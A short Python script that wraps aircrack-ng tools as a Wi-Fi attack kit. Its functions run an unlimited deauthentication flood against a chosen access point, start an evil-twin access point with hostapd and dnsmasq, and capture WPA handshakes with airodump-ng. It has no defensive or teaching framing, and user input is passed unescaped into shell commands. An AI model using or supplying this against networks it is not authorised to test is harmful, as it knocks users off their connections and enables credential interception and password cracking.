import os

def deauth_attack():
    target_bssid = input("Enter target BSSID: ")
    target_channel = input("Enter target channel: ")

    print("Starting deauthentication attack...")
    os.system(f"sudo airmon-ng start wlan0 {target_channel}")
    os.system(f"sudo aireplay-ng --deauth 0 -a {target_bssid} wlan0mon")

def evil_twin_attack():
    ssid = input("Enter target SSID: ")

    print("Starting Evil Twin Attack...")
    os.system(f"sudo hostapd -B /etc/hostapd.conf")
    os.system(f"sudo dnsmasq -C /etc/dnsmasq.conf")

def wpa_handshake_capture():
    target_bssid = input("Enter target BSSID: ")
    target_channel = input("Enter target channel: ")
    output_file = input("Enter output file name for handshake: ")

    print("Capturing WPA handshake...")
    os.system(f"sudo airodump-ng --bssid {target_bssid} --channel {target_channel} -w {output_file} wlan0mon")
